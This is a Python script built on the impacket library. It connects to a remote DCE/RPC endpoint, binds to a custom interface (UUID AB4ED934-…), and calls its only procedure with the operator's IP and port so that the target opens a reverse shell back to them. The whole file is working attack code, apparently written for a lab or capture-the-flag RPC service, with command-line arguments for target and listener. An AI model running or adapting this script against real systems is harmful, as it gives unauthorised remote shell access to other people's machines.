import argparse
from impacket.dcerpc.v5 import transport
from impacket.structure import Structure
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory

parser = argparse.ArgumentParser()
parser.add_argument("-rip", help="Remote computer to target", dest="target_ip", type=str, required=True)
parser.add_argument("-rport", help="IP of the remote procedure listener", dest="port", type=int, required=True)
parser.add_argument("-lip", help="Local IP to receive the reverse shell", dest="lip", type=str, required=True)
parser.add_argument("-lport", help="Local port to receive the reverse shell", dest="lport", type=int, required=True)

args = parser.parse_args()
target_ip = args.target_ip
port = args.port
lip = args.lip
lport = args.lport

class SendReverseShell(NDRCALL):
    structure = (
        ('ip_address', WSTR),
        ('port', "<i")
    )

# Creates the string binding
stringBinding = r'ncacn_ip_tcp:{}[{}]'.format(target_ip, port)

# Connects to the remote endpoint
transport = DCERPCTransportFactory(stringBinding)
dce = transport.get_dce_rpc()
dce.connect()
print("[*] Connected to the remote target")

# Casts the UUID string and version of the interface into a UUID object and binds to the interface
interface_uuid = uuidtup_to_bin(("AB4ED934-1293-10DE-BC12-AE18C48DEF33", "1.0"))
dce.bind(interface_uuid)
print("[*] Binded to AB4ED934-1293-10DE-BC12-AE18C48DEF33")

print("[*] Formatting the client stub")
# Creates the client stub and pack its data so it valid
query = SendReverseShell()
query['ip_address'] = f"{lip}\x00"
query['port'] = lport

print("[*] Calling the remote procedure")
try:
    # Calls the function number 0 (the first and only function exposed by our interface) and pass the data
    dce.call(0, query)
    # Reading the answer of the RPC server
    dce.recv()
except Exception as e:
    print(f"[!] ERROR: {e}")
finally:
    print("[*] Disconecting from the server")
    # Disconnecting from the remote target
    dce.disconnect()
